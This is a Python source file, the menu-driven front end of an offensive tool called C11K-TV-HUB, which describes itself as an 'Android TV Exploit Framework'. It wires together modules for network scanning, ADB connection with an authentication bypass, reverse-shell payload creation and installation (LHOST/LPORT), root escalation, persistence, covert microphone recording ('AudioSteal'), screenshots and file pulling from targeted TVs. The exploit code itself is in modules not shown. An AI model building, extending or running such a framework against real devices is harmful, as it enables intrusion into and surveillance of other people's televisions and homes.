#!/usr/bin/env python3
import sys
import os
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from modules.utils_modules.color_output import ColorOutput
from modules.utils_modules.logger import Logger
from modules.utils_modules.config_loader import ConfigLoader
from modules.utils_modules.error_handler import ErrorHandler
from modules.attack.connect import Connect
from modules.attack.payload_injector import PayloadInjector
from modules.attack.persistence_setup import PersistenceSetup
from modules.attack.post_exploit import PostExploit
from modules.attack.privesc import Privesc
from modules.recon.network_mapper import NetworkMapper
from modules.recon.service_detector import ServiceDetector
from modules.recon.vulnerability_checker import VulnerabilityChecker
from modules.tv_specific.remote_control import RemoteControl
from modules.tv_specific.screencast import Screencast
from modules.tv_specific.volume_control import VolumeControl
from modules.tv_specific.audio_steal import AudioSteal
from modules.tv_specific.hdmi_cec_control import HDMICECControl
from modules.tv_specific.channel_control import ChannelControl


class C11KTVHub:
    def __init__(self):
        self.color = ColorOutput()
        self.config_loader = ConfigLoader(Path(__file__).parent)
        self.config = self.config_loader.load_all()
        self.logger = Logger("C11K-TV-HUB", level=self.config.get("general", {}).get("log_level", "INFO"))
        self.error_handler = ErrorHandler(self.logger)
        self.version = "1.0.0"
        self._init_modules()

    def _init_modules(self):
        self.connect = Connect(self.config)
        self.payload = PayloadInjector(self.config)
        self.persistence = PersistenceSetup(self.config)
        self.post = PostExploit(self.config)
        self.privesc = Privesc(self.config)
        self.network = NetworkMapper(self.config)
        self.service = ServiceDetector(self.config)
        self.vuln = VulnerabilityChecker(self.config)
        self.remote = RemoteControl(self.config)
        self.screencast = Screencast(self.config)
        self.volume = VolumeControl(self.config)
        self.audio = AudioSteal(self.config)
        self.hdmi = HDMICECControl(self.config)
        self.channel = ChannelControl(self.config)

    def main_menu(self):
        while True:
            self.color.clear_screen()
            self.color.print_header(f"C11K-TV-HUB v{self.version} - Android TV Exploit Framework")
            print("""
    [1]  Ag Tarama (Network Scan)
    [2]  Servis Tespiti (Service Detect)
    [3]  Baglan (Connect)
    [4]  Zafiyet Kontrolu (Vulnerability Check)
    [5]  Payload Olustur & Yukle
    [6]  Yetki Yukseltme (Privesc)
    [7]  Kalicilik (Persistence)
    [8]  TV Kontrol (Remote, Screencast, Volume, Audio)
    [9]  Post-Exploit (Screenshot, Dump, Dosya Cekme)
    [0]  Cikis
            """)
            choice = self.color.input_prompt("C11K> ", "cyan").strip()
            if choice == "1":
                self.scan_menu()
            elif choice == "2":
                self.service_menu()
            elif choice == "3":
                self.connect_menu()
            elif choice == "4":
                self.vuln_menu()
            elif choice == "5":
                self.payload_menu()
            elif choice == "6":
                self.privesc_menu()
            elif choice == "7":
                self.persistence_menu()
            elif choice == "8":
                self.tv_menu()
            elif choice == "9":
                self.post_menu()
            elif choice == "0":
                self.color.print_success("Cikiliyor...")
                sys.exit(0)
            else:
                self.color.print_error("Gecersiz secenek!")
            input("\nDevam etmek icin Enter'a basin...")

    def scan_menu(self):
        self.color.print_info("Ag taranıyor...")
        subnet = self.config.get("network", {}).get("scan_subnet", "192.168.1.0/24")
        results = self.network.scan_subnet(subnet)
        for r in results:
            print(f"{r.get('ip')} - {r.get('hostname', '')} - {r.get('vendor', '')}")

    def service_menu(self):
        ip = self.color.input_prompt("Hedef IP: ", "yellow")
        if not ip:
            return
        results = self.service.detect_all(ip)
        for r in results:
            status = "ACIK" if r.get("open") else "KAPALI"
            print(f"Port {r.get('port')}: {r.get('service')} - {status}")

    def connect_menu(self):
        ip = self.color.input_prompt("Hedef IP: ", "yellow")
        port = int(self.color.input_prompt("Port (varsayilan 5555): ", "yellow") or "5555")
        result = self.connect.connect_with_bypass(ip, port)
        if result["success"]:
            self.color.print_success(f"Baglanti kuruldu: {ip}:{port} (bypass: {result.get('bypass_used', False)})")
        else:
            self.color.print_error("Baglanti basarisiz.")

    def vuln_menu(self):
        ip = self.color.input_prompt("Hedef IP: ", "yellow")
        port = int(self.color.input_prompt("Port (varsayilan 5555): ", "yellow") or "5555")
        results = self.vuln.check_device_vulnerabilities(ip, port)
        for r in results:
            cve = r.get("cve", "Bilinmiyor")
            vuln = "EVET" if r.get("vulnerable") else "HAYIR"
            print(f"{cve}: {vuln} - {r.get('details', '')}")

    def payload_menu(self):
        lhost = self.color.input_prompt("LHOST (kendi IP): ", "yellow")
        lport = int(self.color.input_prompt("LPORT: ", "yellow") or "4444")
        result = self.payload.generate_and_install(lhost, lport)
        if result["success"]:
            self.color.print_success("Payload olusturuldu ve yuklendi.")
        else:
            self.color.print_error("Payload islemi basarisiz.")

    def privesc_menu(self):
        result = self.privesc.elevate()
        if result["success"]:
            self.color.print_success(f"Root erisimi saglandi: {result['message']}")
        else:
            self.color.print_error("Root yukseltme basarisiz.")

    def persistence_menu(self):
        result = self.persistence.setup_all()
        self.color.print_info(str(result))

    def tv_menu(self):
        print("""
    [1]  Remote Control (key)
    [2]  Screencast
    [3]  Volume
    [4]  Audio Steal
    [5]  HDMI-CEC
    [6]  Channel Control
        """)
        sub = self.color.input_prompt("Secim: ", "cyan")
        if sub == "1":
            keycode = int(self.color.input_prompt("Keycode: ", "yellow"))
            self.remote.send_key(keycode)
        elif sub == "2":
            path = self.screencast.take_screenshot()
            self.color.print_info(f"Screenshot kaydedildi: {path}")
        elif sub == "3":
            self.volume.volume_up()
        elif sub == "4":
            self.audio.start_microphone_recording(10)
        elif sub == "5":
            self.hdmi.tv_power_on()
        elif sub == "6":
            self.channel.channel_up()

    def post_menu(self):
        path = self.post.take_screenshot()
        if path:
            self.color.print_success(f"Screenshot: {path}")
        else:
            self.color.print_error("Screenshot alinamadi.")

if __name__ == "__main__":
    try:
        hub = C11KTVHub()
        hub.main_menu()
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C algilandi, cikiliyor...")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Kritik hata: {e}")
        sys.exit(1)
